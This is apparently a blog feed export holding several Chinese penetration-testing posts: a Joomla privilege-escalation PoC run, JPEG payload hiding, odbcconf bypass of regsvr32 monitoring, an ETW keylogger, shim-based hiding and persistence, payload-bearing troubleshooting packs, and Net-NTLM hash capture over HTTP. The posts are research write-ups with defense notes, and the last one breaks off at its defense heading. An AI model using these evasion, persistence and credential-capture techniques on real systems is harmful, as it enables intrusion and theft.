漏洞原理构造特殊的请求包实现对用来表示权限的groups进行赋值 补丁分析官方删除了UsersControllerUser::register()方法 注： 以上引用自http://paper.seebug.org/88/ 0x03 实际测试 测试系统： Win8.1 x86 1、搭建php环境下载安装phpStudy 安装后如图 配置目录为：C:\WWW 2、配置Joomla环境下载3.6.3版本的Joomla，地址如下： https://github.com/joomla/joomla-cms/releases/download/3.6.3/Joomla_3.6.3-Stable-Full_Package.tar.gz 解压后将文件放于C:\WWW下 访问http://localhost进入安装页面 如图 数据库类型选择MySQL，如图 登陆数据库，默认密码为root 如图 等待安装完成 3、网页登陆，测试环境配置成功，如图 4、poc测试poc地址： https://github.com/XiphosResearch/exploits/tree/master/Joomraa 参数如下： joomraa.py -u hacker -p password -e hacker@example.com http://192.168.1.111 如下图，提示需要登陆邮箱查看激活邮件，所以邮箱参数需要填写真实的邮箱地址 此时查看Joomla后台，发现用户添加成功，但是状态为未激活，如图 5、设置Joomla，开启发送激活邮件的功能选择Global Configuration-Global-Server 如图 设置邮箱参数 注：邮箱账户需要开启SMTP功能 选择Send Test Mail验证邮箱，如图 如图，验证邮件接收成功 6、再次测试POC成功收到激活邮件，如图 点开链接后报错，如图 查看Joomla源码，位置如下： https://github.com/joomla/joomla-cms/blob/staging/components/com_users/controllers/registration.php 找到问题原因： If user registration or account activation is disabled, throw a 403. 如下图 7、开启用户注册功能选择Global Configuration-Users-User Options，点击允许用户注册，如图 注： 自Joomla3.4以后，用户注册功能默认关闭 8、最后测试开启用户注册功能后，再次点击激活邮件，成功激活账户 如图 后台显示用户激活，如图 9、得出最终结论利用该漏洞可在网站后台关闭用户注册的情况下创建特权用户，但是状态为未激活 只有网站后台开启发送邮件的功能后，攻击者邮箱才能收到激活邮件 只有网站后台开启用户注册功能，激活码才能生效，使得用户被激活 未激活的用户无法用于登录 高于3.4版本的Joomla，用户注册功能默认关闭 Joomla升级到3.6.4后，测试poc显示攻击成功，然而网站后台并没有添加用户，也不会发送激活邮件，防御成功 综上，攻击者想要获得网站后台管理员权限，需要同时满足以下条件： Joomla版本为3.4.4-3.6.3 网站后台开启发送邮件功能 网站后台开启用户注册功能 0x04 备注 感谢DM的帮助 本文仅为测试记录 根据POC开发了一个检查网站是否开放注册功能的python脚本，地址如下： https://github.com/3gstudent/Test-Exploit-for-Joomla-3.4.4-3.6.4 可用来简单判断网站是否支持用户注册 在此提醒网站管理员，尽快升级Joomla，如果Joomla版本过低，并且开启发送邮件和用户注册功能，那么很容易遭到攻击。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[隐写技巧——利用JPEG文件格式隐藏payload]]></title>
    <url>%2Fposts%2Fd0a16fbf.html</url>
    <content type="text"><![CDATA[0x00 前言 继续对图片隐写技巧的学习，这次是对JPEG文件格式的学习和理解。同PNG文件的格式对比，JPEG文件相对简单，读取其中隐藏payload的方式大同小异，两者区别在于文件格式不同，可供利用的细节存在差异。 本文相关工具： 16进制编辑器：Hex Editor 隐写检测：Stegdetect 下载地址： https://github.com/abeluck/stegdetect 编辑Exit信息：MagicEXIF 下载地址： http://www.magicexif.com/ 分析JPEG图片格式：JPEGsnoop 下载地址： http://www.impulseadventure.com/photo/jpeg-snoop.html 0x01 相关概念 JPEG文件JPEG是Joint Photographic Experts Group(联合图像专家组)的缩写 支持有陨压缩 不支持透明 不支持动画 非矢量 JEPG同JPG的区别 JPEG既可作为扩展名，又能代表文件格式 JPG是JPEG的简写，代表扩展名 JPEG和JPG基本上是没有区别的，它们的格式也是通用的 色彩模型采用YCrCb色彩模型，更适合图形压缩，而不是RGB Y表示亮度 Cr表示红色分量 Cb表示蓝色分量 人眼对图片上的亮度Y的变化远比色度C的变化敏感. 如果每个点保存一个8bit的亮度值Y, 每2x2个点保存一个CrCb值, 图象在肉眼中的感觉不会起太大的变化，而且节省一半的空间 RGB模型4个点需要4x3=12字节 YCrCb模型4个点需要4+2=6字节 [R G B] -&gt; [Y Cb Cr] 转换： Y = 0.299R + 0.587G + 0.114*B Cb = - 0.1687R - 0.3313G + 0.5 *B + 128 Cr = 0.5 R - 0.4187G - 0.0813*B + 128 [Y,Cb,Cr] -&gt; [R,G,B] 转换： R = Y + 1.402 *(Cr-128) G = Y - 0.34414(Cb-128) - 0.71414(Cr-128) B = Y + 1.772 *(Cb-128) 文件格式JPEG文件大体上可以分成两个部分：标记码和压缩数据 标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值 在每个标记码之前可以添加数目不限的无意义的0xFF填充，连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始 常见的标记码： SOI 0xD8 图像开始 APP0 0xE0 应用程序保留标记0 APPn 0xE1 - 0xEF 应用程序保留标记n(n=1～15) DQT 0xDB 量化表(Define Quantization Table) SOF0 0xC0 帧开始(Start Of Frame) DHT 0xC4 定义Huffman表(Define Huffman Table) DRI 0XDD 定义差分编码累计复位的间隔(Define Restart Interval) SOS 0xDA 扫描开始(Start Of Scan) EOI 0xD9 图像结束 压缩数据： 前两个字节保存整个段的长度，包括这两个字节 注： 这个长度的表示方法按照高位在前，低位在后，与PNG文件的长度表示方法不同 例如长度是0x12AB，存储顺序为0x12，0xAB Exif信息Exif文件是JPEG文件的一种，遵从JPEG标准，只是在文件头信息中增加了拍摄信息和索引图 用相机拍出来的jpeg都会有这个信息 储存在APP1(0xFFE1)数据区中 接下来两字节保存APP1数据区(即Exif数据区)的大小 接着为Exif Header，固定结构：0x457869660000 后面为Exif的数据 查看Exif信息的工具：exiftool 下载地址： https://github.com/alchemy-fr/exiftool 编辑Exit信息的工具：MagicEXIF 下载地址： http://www.magicexif.com/ 添加操作如图 0x02 常见隐写方法 DCT加密 LSB加密 DCT LSB Average DCT High Capacity DCT High Capacity DCT - Algorithm 以上隐写方法引用自： https://www.blackhat.com/docs/asia-14/materials/Ortiz/Asia-14-Ortiz-Advanced-JPEG-Steganography-And-Detection.pdf 目前已经有很多开源的工具能够实现以上高级的隐写方法 常见隐写工具： JSteg JPHide OutGuess Invisible Secrets F5 appendX Camouflage 当然，对应的隐写检测工具也出现了很久 比如：Stegdetect 下载地址： https://github.com/abeluck/stegdetect 0x03 利用JPEG文件格式隐藏Payload 接下来介绍在学习文件格式后产生的一些隐藏思路： 1、直接在尾部添加数据 如图，不会影响图片的正常浏览 2、插入自定义COM注释COM注释为0xff和0xfe 插入数据0x11111111 长度为0x04 总长度为0x06 完整的十六进制格式为0xffff000611111111 插入位置为DHT前面，如图 插入后如图，不影响图片的正常查看 将ff改为fe，如图，同样不影响图片的正常查看 3、插入可被忽略的标记码原理同上，标志码换成可被忽略的特殊值 例如： 00 01 *TEM d0 *RST0 dc DNL ef APP15 经测试以上标识码均不影响图片的正常查看 4、修改DQTDQT: Define Quantization Table 标识码为0xdb 接下来两字节表示长度 接下来一字节表示QT设置信息 前4bit为QT号 后4bit为QT精度,0=8bit,否则为16bit 最后是QT信息，长度为64的整数倍 查看测试图片的DQT信息，如图 长度为0x43，十进制为67 00表示QT号为0，精度为8bit 接着64字节为QT信息字节 注： 此处DQT格式参考自http://www.opennet.ru/docs/formats/jpeg.txt 尝试将这64字节替换，如图 前后对比如图，能够发现图片的变化 如果仅仅是调整其中部分字节，改为payload，那么能有多大区别呢，对比如图 依次类推，可供修改的位置还有很多 0x04 检测和识别 对于以上的隐藏方法，借助jpeg图片格式分析工具就能发现其中的痕迹 比如JPEGsnoop 下载地址： http://www.impulseadventure.com/photo/jpeg-snoop.html 支持如下文件的格式分析： .JPG - JPEG Still Photo .THM - Thumbnail for RAW Photo / Movie Files .AVI* - AVI Movies .DNG - Digital Negative RAW Photo .PSD - Adobe Photoshop files .CRW, .CR2, .NEF, .ORF, .PEF - RAW Photo .MOV* - QuickTime Movies, QTVR (Virtual Reality / 360 Panoramic) .PDF - Adobe PDF Documents 实际测试： 如下图，发现了图片中添加的COM注释 如下图，通过查看DQT的数据识别添加的payload，0x11对应的十进制为17 同样，JPEGsnoop能够解析jpeg图片的EXIF信息，如下图 注： 为便于测试，截图中的以下数值通过MagicEXIF软件手动添加： EXIF Make/Model: OK [test] [???] EXIF Makernotes: NONE EXIF Software: OK [MagicEXIF Metadata Codec 1.02] 0x05 补充 相比于png文件，由于jpeg文件没有对图像数据的校验位，所以在jpeg文件中添加payload简单了很多 下载JPEG图片解析并执行payload的方法不再介绍 (可参照https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/) 0x06 小结 本文对JPEG的格式进行介绍，着重分析如何根据JPEG的文件格式，利用特定标志码隐藏payload，这种方式虽然不会影响图片的正常浏览，但是借助于格式分析软件仍能够发现其中的细节。介绍JPEG格式的官方文档里面待学习的内容还有很多，认识越深，可供研究的技巧将会更多。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes Weekly No.3(Use odbcconf to load dll & Get-Exports & ETW USB Keylogger)]]></title>
    <url>%2Fposts%2F69b91f96.html</url>
    <content type="text"><![CDATA[About: Use odbcconf to load dll Use powershell to get dll exports Use Event Tracing for Windows to log keystrokes from USB keyboards 目录： 介绍为什么通过odbcconf加载dll可以绕过在命令行下对regsvr32的拦截 比ExportsToC++更方便的批量输出dll导出函数的工具——ExportsToC++ 通过ETW实现对USB键盘的键盘记录，记录测试心得 0x01 Use odbcconf to load dll Reference: https://twitter.com/subTee/status/789459826367606784 简介 如图，Casey Smith在twitter分享的一个技巧，如果将执行regsvr32加载dll的代码写在.rsp文件中，再通过odbcconf.exe去调用，这样可以绕过在命令行下对regsvr32的拦截。本文将要介绍为什么可以绕过在命令行下对regsvr32的拦截。 odbcconf： 用于配置ODBC驱动和数据源 详细说明见如下链接： https://msdn.microsoft.com/en-us/library/ee388579(v=vs.85).aspx 用法如图 值得注意的是odbcconf包含一个注册dll的功能，我在之前的文章《Code Execution of Regsvr32.exe》中具体介绍过如何开发可被regsvr32调用的dll，编写一个测试dll进行测试(此处略，不再重复介绍)。 cmd下运行： odbcconf.exe /a {regsvr c:\test\odbcconf.dll} 如图，成功调用dll，弹出对话框 站在防御者的角度，为了防止利用regsvr32调用dll的方法被滥用，常常会选择监控命令行的输入(如通过EMET创建规则),只要发现命令行中包括regsvr的字符就会对其拦截 当然，上述操作包含了字符regsvr，将会被拦截 使用Process Explorer查看odbcconf进程的命令行，包含字符regsvr 如图 但是，使用odbcconf的另一个功能却可以绕过，那就是/F参数 用法： odbcconf.exe /f my.rsp my.rsp为响应文件，里面包含执行的操作： REGSVR c:\test\odbcconf.dll 注： 这里需要填入dll的绝对路径 如图，成功调用dll，弹出对话框 使用Process Explorer再次查看命令行，不包含字符regsvr 如图 NickTyrer根据这个方法分享了他的代码，实现了在dll中运行powershell命令，地址如下： https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b 编译工程之前，需要如下设置： 设置编译平台为x86或者x64 安装UnmanagedExports和System.Management.Automation在Visual Studio控制面板选择TOOLS-Library Package Manager-Package Manager Console，输入：Install-Package UnmanagedExportsInstall-Package System.Management.Automation 0x02 Use powershell to get dll exports Reference: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1 简介在《Study-Notes-Weekly-No.1(Monitor-WMI-ExportsToC++-Use-DiskCleanup-bypass-UAC)》(文章链接：https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI-ExportsToC++-Use-DiskCleanup-bypass-UAC)/)介绍过一款批量输出dll导出函数的工具——ExportsToC++ ，运行的前提是需要.NET Framework 2.0和安装Microsoft Visual Studio b33f@FuzzySecurity对此作了改进，开源了powershell下的Get-Exports，特点是不再需要Microsoft Visual Studio的开发环境，更简便快捷，同时支持32位和64位的dll 测试代码如下： Get-Exports -DllPath c:\Windows\system32\dimsjob.dll -ExportsToCpp C:\test\export.txt 运行后如图，显示导出函数信息 同时生成可供使用的c++代码并保存在C:\test\export.txt下，如图 0x03 Use Event Tracing for Windows to log keystrokes from USB keyboards Reference: https://www.cyberpointllc.com/srt/posts/srt-logging-keystrokes-with-event-tracing-for-windows-etw.html 简介CyberPoint SRT在Ruxcon介绍了他们对ETW的新用法，实现了对USB键盘的键盘记录，并且公布了一个测试POC，本文将对其进行测试，分析测试心得。 ETW： 是Event Tracing for Windows的缩写 提供了一种对用户层应用程序和内核层驱动创建的事件对象的跟踪记录机制 通常用于协助管理员和开发人员解决和测量系统和应用程序的性能 公开资料显示尚未有利用ETW实现键盘记录的方法 介绍ETW的一些学习资料： https://randomascii.wordpress.com/2015/09/24/etw-central/ POC下载地址： https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC 注： 该POC已经被杀毒软件查杀，测试需要放行 要求： Windows 7 (USB 2.0) Windows 8+(USB 2.0 and USB 3.0) 管理员权限运行 注： 不支持PS/2接口的键盘 测试环境： Win8.1 x86 vs2013 安装.NET Framework .net 4.5.2 Install-Package Microsoft.Diagnostics.Tracing.TraceEvent USB 2.0的键盘 管理员权限运行exe，记录测试如图 POC最大的不足： 记录存在延迟 不稳定，常常报错[!] ignoring non-usb keyboard device: 0xFFFFFFFF8CFF6070 从POC到工具还有很长的的一段路要走，但这个思路值得学习，ETW的利用方法值得总结，期待CyberPoint SRT的后续文章 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的Application Compatibility Shims]]></title>
    <url>%2Fposts%2F7ddc0d70.html</url>
    <content type="text"><![CDATA[0x00 前言 Application Compatibility是一个框架，主要用来解决应用程序在新版Windows系统上的兼容性问题。然而在渗透测试中它却有着更多的用处，本文将对公开资料进行整理，介绍在渗透测试中的具体利用技术，帮助大家更好的认识它，防御它。 0x01 简介 Shim：相当于是在应用程序和Windows API之间的逻辑层。 当应用程序创建进程的时候，WindowsLoader首先会检查sysmain.sdb（位于%windir%\AppPatch\），如果存在已注册的sdb文件，IAT将被重定向到Shim，实现功能替换。 本文将介绍以下内容： 创建Shim文件 实际利用方法 相关开源工具 检测和防御 0x02 创建Shim文件 1.Microsoft Application Compatibility Toolkit(ACT)下载地址： https://www.microsoft.com/en-us/download/details.aspx?id=7352 默认修复方式种类个数为365 启动时加入/x参数可获得更多修复方式，总数807 如图 根据提示创建后生成.sdb文件，需要安装使其生效 可在Microsoft Application Compatibility Toolkit中直接选择安装，如图 0x03 实际利用方法 1.Hiding in the Registry选择VirtualRegistry Command line填入： ADDREDIRECT(HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run^HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHidden) 安装shim 启动regedit HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run下键值无法查看,如图 但在cmd下执行如下命令可以查看： reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 如图 2.Hiding in the File System选择CorrectFilePaths Command line填入： c:\test\;c:\users Module name 填入*.exe,点击add 安装shim 启动cmd.exe，无法查看c:\test下的文件 如图 注： 类似的还有VirtualizeDeleteFile 和RedirectShortcut 3.Persistence可供选择的Fix有： InjectDll LoadLibraryRedirect RedirectShortcut RedirectEXE ShimViaEAT LoadLibraryfromCWD Hijacking DLL 4.Disable Security Features of the OS可供选择的Fix有： Disable NX Disable ASLR DisableSEH Prevent the Loading of DLLs Disable Windows Resource Protection Elevate to Administrator DisableWindowsDefender DisableAdvancedRPCClientHardening 注： 以上思路参考自： http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett http://sdb.tools/files/paper.pdf 0x04 安装和卸载Shim 1.sdbinst.exe用来安装和卸载.sdb文件 微软官方提供，默认位于c:\windows\system32下，运行需要管理员权限 usage: -? - print this help text. -p - Allow SDBs containing patches. -q - Quiet mode: prompts are auto-accepted. -u - Uninstall. -g {guid} - GUID of file (uninstall only). -n &quot;name&quot; - Internal name of file (uninstall only). 卸载： sdbinst.exe -u -n “name” 安装过程中sdbinst.exe做了如下操作： 在如下注册表位置创建键值保存Shim信息： HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB 将sdb文件复制到如下文件路径： C:\Windows\AppPatch\Custom\ C:\Windows\AppPatch\Custom\Custom64\ 添加到已安装的应用程序列表中 依次打开控制面板-程序-程序和功能-卸载程序，可看到安装的Shim名称 2.sdb-explorer下载地址： https://github.com/evil-e/sdb-explorer 同样可用来安装.sdb文件，相比于sdbinst.exe多了如下特征： 源代码开源 支持In-Memory patch 安装过程不将sdb文件复制到C:\Windows\AppPatch\Custom\下 安装过程不在已安装的应用程序列表中显示安装的Shim名称 usage: Print full sdb tree sdb-explorer.exe -t filename.sdb Print patch details sdb-explorer.exe [-i] -p filename.sdb (patch | patchid | patchref | patchbin) -i - create IDAPython Script (optional) Print patch details for checksum sdb-explorer.exe [-i] -s filename.sdb Create file containing the leaked memory sdb-explorer.exe -l filename.sdb Print Match Entries sdb-explorer.exe -d filename.sdb Create Patch From file sdb-explorer.exe -C config.dat [-o filename.sdb] Register sdb file sdb-explorer.exe -r filename.sdb [-a application.exe] Display usage sdb-explorer.exe -h 演示如图 执行以下命令注册sdb文件： sdb-explorer.exe -r C:\Users\a\Desktop\test1.sdb -a putty.exe 注： -a的参数指定程序的名称，不能填入程序的绝对路径 通过sdb-explorer.exe注册的sdb文件无法通过sdbinst.exe来删除，会显示sbd文件不存在，如图 卸载可通过删除注册表键值的方式实现 注： 通过sdb-explorer可以创建一个In-Memory patch的shim，接着编译成sdb文件，进而安装使用，关于In-Memory patch的学习心得将在以后分享 In-Memory patch： 可以替换或写入内存中的某个区域的任意字节 可用来绕过应用程序白名单 0x05 查看Shim信息 1.sdb2xml从.sdb文件提取出xml格式的数据，可用来分析sdb文件 作者： Heath Stewart 下载地址： https://blogs.msdn.microsoft.com/heaths/2007/11/03/shim-database-to-xml/ usage: sdb2xml sdb [-out report] [-base64 | -extract] [-?] sdb Path to the shim database to process. -base64 Base-64 encode data in the XML report. -extract Extract binary data to current or report directory. -out report Path to the XML file to generate; otherwise, output to console. 如图，使用sdb2xml查看test1.sdb文件中的数据 2.Compatibility Database Dumper (CDD)作者： Alex Ionesceu usage: cdd.exe [-s][-e][-l][-f][-p][-d kernel-mode database file][-a usermode database file] -s Show shims -e Show executables -l Show layers -f Show flags -p Show patches -d Use Blocked Driver Database from this path -a Use Application Compatibility Database from this path 参考地址： http://www.alex-ionescu.com/?p=40 但作者Alex Ionescu目前尚未将其开源 3.Shim Database Tool (sdb)作者： Jochen Kalmbach 下载地址： http://blog.kalmbach-software.de/2010/02/22/the-shim-database/ 注： 该工具源代码开源 Usage: sdb.exe [-noids] [-match] [PathToShimDatabse] [PathToFileName] -noids Will prevent the output of the TagIds -match Will match the provided file with the installed databases and displays the activated shims In this case &#39;PathToFileName&#39; is required NOTE: If no shim database path is provided, the default database will be used. 从.sdb文件提取出xml格式的数据，演示如图 显示指定程序是否被添加Shim，如图，找到putty.exe已被添加了一个Shim，guid为8F9DA6E2-5A7C-41E1-B89F8B72D63DEBA8 0x06 检测和防御 禁用Shim的方法： 英文系统：打开gpedit.msc，选择Administrative Templates-Windows Components-Application Compatibility-Turn off Application Compatibility Engine 中文系统：打开gpedit.msc，选择计算机配置-管理模板-Windows组件-应用程序兼容性-关闭应用程序兼容性引擎 但不建议关闭Shim，原因如下： 导致EMET无法使用 无法更新补丁 检测和防御： AutoRuns不会检测到Shim Shim的安装需要管理员权限，注意权限控制 监控特定注册表键值HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\CustomHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB 注意系统中未签名的sdb文件 使用检测脚本，如https://github.com/securesean/Shim-Process-Scanner和https://github.com/securesean/Shim-Process-Scanner-Lite 0x07 小结 本文对Application Compatibility Shims在渗透测试中的相关技巧做了整理，希望对大家有所帮助。对于In-Memory patch，值得研究的还有很多，学习心得将在以后分享。 更多关于Shim的研究资料可访问： http://sdb.tools/index.html 本文参考链接： http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/ https://www.blackhat.com/docs/asia-14/materials/Erickson/Asia-14-Erickson-Persist-It-Using-And-Abusing-Microsofts-Fix-It-Patches.pdf http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett http://sdb.io/erickson-codeblue.pdf LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[故障诊断平台在渗透测试中的应用技巧]]></title>
    <url>%2Fposts%2Fc6ff851a.html</url>
    <content type="text"><![CDATA[0x00 前言 近日，Proofpoint的Matthew Mesa和Axel F发现了一种新型钓鱼方式，攻击者将故障排除包（troubleshooting pack）作为邮件附件，欺骗用户运行，隐蔽执行Payload。他们在文章中介绍了攻击者采用的方法和隐藏手段，提示用户对此提高警惕。 文章链接： https://www.proofpoint.com/us/threat-insight/post/windows-troubleshooting-platform-leveraged-deliver-malware 本文将站在技术研究的角度，介绍如何开发一个包含payload的故障排除包，并结合攻击思路分析防御方法，希望能帮助大家对这项技术有进一步的认识。 0x01 简介 Windows故障诊断平台： 英文翻译Windows Troubleshooting Platform，缩写为WTP 开发商可基于该平台编写故障排除包(troubleshooting pack)，帮助用户解决遇到的PC问题 WTP结构如图 图片引用自https://msdn.microsoft.com/en-us/library/windows/desktop/dd323706(v=vs.85).aspx 简要流程如下： 检查故障排除包的数字签名，如果不可用，直接退出 依次执行检测脚本（detection scripts）、解决脚本（resolution scripts）、验证脚本（verification scripts），尝试解决故障 生成结果报告和调试报告 故障排除包： 由五个组件构成： 故障排除清单（Troubleshooting manifest） 检测脚本（detection scripts） 解决脚本（resolution scripts） 验证脚本（verification scripts） 本地化资源（localized resources） 详情如图 引用自https://msdn.microsoft.com/en-us/library/windows/desktop/dd323706(v=vs.85).aspx 0x02 开发故障排除包 官方开发工具： TSPDesigner 注： 该工具包含于Windows 7 SDK中 实际测试只有v7.0和v7.1包含此工具 Windows 7 SDK version 7.0需要搭配.NET Framework 3.5 SP1，下载地址如下： https://www.microsoft.com/en-us/download/details.aspx?id=3138 Windows 7 SDK version 7.1需要搭配.NET Framework 4，下载地址如下： https://www.microsoft.com/en-us/download/details.aspx?id=8279 TSPDesigner位于默认目录C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\TSPDesigner下，包含以下内容： 如图 详细开发介绍可参照： https://msdn.microsoft.com/en-us/library/windows/desktop/dd323712(v=vs.85).aspx 下面实例演示如何通过TSPDesigner生成测试故障排除包 1.设置属性，也就是故障包的第一页Project Name: testwtp Project Description: troubleshooting pack test Privacy URL: https://3gstudent.github.io/ 如图 2.添加root cause，点击Add New Root Cause，设置故障信息Root Cause ID: ServiceIsStopped Root Cause Name: The service is stopped. Root Cause Description: The service is stopped.You need enable it. 如图 3.设置Troubleshooter如图，指定需要提升权限，关闭交互 4.设置ResolverResolver Name: StartTheService Resolver Description: Start the service. Prompt the User: No Elevation: Yes Interactions: No 如图 指定需要提升权限，关闭用户警告，关闭交互 5.设置Verifier选择No，不需要确定故障被解决 6.设置Scripts如图 注：由于在步骤3、4指定了提升权限，所以此处的Troubleshooter Script和Resolver Script已经具有管理员权限 可在此处添加payload 7.设置数字签名选择Project-Options，找到Code Signing 如图 可选择使用Test Certificate或是指定一个证书 测试默认选择Use Generated Test Certificate 8.生成选择Build-Build Pack 生成如下文件： 如图 1. TS_ServiceIsStopped.ps1对应Troubleshooter Script RS_ServiceIsStopped.ps1对应Resolver Script 注： 查看这两个ps脚本可以发现其中包含的payload 2. testwtp.diagpkg为清单文件，包含troubleshooting pack中的参数，格式为xml，具体语法可参考： https://msdn.microsoft.com/en-us/library/windows/desktop/dd323781(v=vs.85).aspx 3. DiagPackage.cat保存该troubleshooting pack的数字签名 注： DiagPackage.cat文件中的数字签名可通过双击查看 如图 4. cab目录下的testwtp.diagcab为封装好的troubleshooting pack，包含以上文件的信息 如图，运行过程中执行payload，弹出管理员权限的cmd.exe 0x03 测试运行故障排除包 将生成的.diagcab文件放到另一个测试系统 报错，如图 这是由于使用的默认Test Certificate在新系统无法被识别，可在TSPDesigner同级目录下找到证书文件TestWindowsTroubleShooting.cer，安装至受信任的根证书颁发机构，如图 数字签名成功识别，如下图 注： 此处显示的发布者名称对应签名证书使用的颁发者，为TestCertforWindowsTroubleShooting 当然，如果使用一个默认可信的证书，那么该故障排除包默认被信任，可直接运行 点击隐私声明，弹出步骤1中设置的Privacy URL：https://3gstudent.github.io/ 如图 至此，成功实现测试故障排除包 0x04 小结 在渗透测试中，使用troubleshooting pack有如下好处： 更加隐蔽，.diagcab文件不常见 更具欺骗性，用户往往对故障排除功能失去警惕 可直接获得管理员权限 内嵌钓鱼页面，可指定隐私声明的链接 防御建议： 微软在一开始就已经注意到了这个问题，所以为troubleshooting pack添加了数字签名验证，所以当遇到troubleshooting pack时（比如某个操作触发了故障修复），首先要对发布者的身份进行判断。 注： 微软提供的troubleshooting pack中发布者名称默认为Microsoft Corporation LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——通过HTTP协议获得Net-NTLM hash]]></title>
    <url>%2Fposts%2Fb6aac82b.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》、《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》和《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》曾介绍了通过SMB协议获得登录用户Net-NTLM hash的方法，利用的前提是客户端通过界面使用SMB协议连接服务器时，默认先使用本机的用户名和密码hash尝试登录。 对于HTTP协议，也同样支持NTLM认证。那么，通过HTTP协议能否同样获得当前登录用户的Net-NTLM hash呢？限制条件有哪些？如何防御？本文将要逐一介绍。 0x01 简介 本文将要介绍以下内容： NTLM Over HTTP Protocol简介 找出利用前提 如何具体利用 防御思路 0x02 NTLM Over HTTP Protocol简介 官方文档： https://msdn.microsoft.com/en-us/library/cc237488.aspx 参考资料： https://www.innovation.ch/personal/ronald/ntlm.html 使用HTTP协议的NTLM认证流程： 客户端向服务器发送一个GET请求，请求获得网页内容 服务器由于开启了NTLM认证，所以返回401，提示需要NTLM认证 客户端发起NTLM认证，向服务器发送协商消息 服务器收到消息后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端 客户端接收到Challenge后，使用输入的密码hash对Challenge加密，生成response，将response发送给服务器 服务器接收客户端加密后的response，经过同样的运算，比较结果，若匹配，提供后续服务，否则，认证失败 直观的流程图，如下图 注： 图片截取自https://www.innovation.ch/personal/ronald/ntlm.html，具体的消息格式可查看链接中的介绍 实际测试服务器： OS: Server2012 R2 IP: 192.168.62.136 安装IIS服务 客户端： OS: Win7 x86 IP: 192.168.62.134 1、服务器开启NTLM认证进入IIS管理页面，如下图 选择Authentication 关闭其他认证，只开启Windows Authentication 添加Provider: NTLM 配置如下图 2、服务器运行Wireshark，进行抓包只提取HTTP 3、客户端访问服务器弹框提示输入用户名密码，如下图 此时服务器抓取的HTTP数据包如下图 对应流程1和2 4、客户端输入正确的用户名密码此时服务器抓取的HTTP数据包如下图 对应流程3-6 5、使用Hashcat对该Net-NTLM hash进行破解NTLMv2的格式为： username::domain:challenge:HMAC-MD5:blob 通过数据包获得challenge，如下图 通过数据包获得username、domain、HMAC-MD5和blob 如下图 拼接格式，使用hash破解即可 详细细节可参考： 《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》中的0x03部分 0x03 利用分析 经过以上的测试，可以看到HTTP协议的破解同SMB协议类似，那么在利用上是否相同呢？ 我们知道，使用SMB协议通过界面操作连接服务器时，默认先使用本机的用户名和密码hash尝试登录，而刚才的测试没有发现HTTP协议也具有这个特性 也就是说，只要用户不输入正确的用户口令，服务器就无法获得正确的Net-NTLM hash，无法进一步利用 并且，Responder和Inveigh的HTTP认证拦截功能也提到能够获得用户的hash，地址如下： https://github.com/SpiderLabs/Responder#features https://github.com/Kevin-Robertson/Inveigh 这个功能该如何使用？能够获得哪种hash？能不能获得客户端当前登录用户的hash？ 我在IE浏览器的配置中找到了答案 打开IE浏览器，找到如下位置： 工具 -&gt; Internet选项 -&gt; 安全 -&gt; 自定义级别 -&gt; 用户验证 如下图 默认情况下，用户认证的登录方式为Automatic logon only in Intranet zone 所以接下来需要做两个测试 测试一将登录方式修改为Automatic logon with current user name and password 重启IE浏览器，再次测试 客户端通过IE访问服务器，弹出登录验证框，此时查看服务器的抓包情况 如下图 发现客户端自动先使用本机的用户名和密码hash尝试登录，这时我们就能够通过进一步破解还原出用户口令，同SMB的利用思路一致 测试二改为域环境，其他不变 客户端也会先使用本机的用户名和密码hash尝试登录 至此，我们找到了限定条件，通过HTTP协议获得当前登录用户的Net-NTLM hash适用于以下两种情况： 客户端用户认证的登录方式为Automatic logon with current user name and password 用户认证的登录方式默认不变，客户端同服务器需要在同一Intranet zone 同样，这也是Responder和Inveigh支持HTTP协议用户hash获取的利用前提 0x04 具体利用方法 1、Intranet zone下使用Responder和Inveigh 如果是在工作组环境下，无法获得当前登录用户的Net-NTLM hash，可在域环境下使用 2、已获得客户端权限，修改用户认证方式 对应注册表HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3下的键1A00 0表示自动使用当前用户名和密码登录 10000表示用户名和密码提示 20000表示只在Intranet区域自动登录，默认值 30000表示匿名登录 如果将客户端用户认证的登录方式修改为Automatic logon with current user name and password，那么客户端在访问任何需要登录验证的网站都会先使用本机的用户名和密码hash尝试登录 0x05 防御 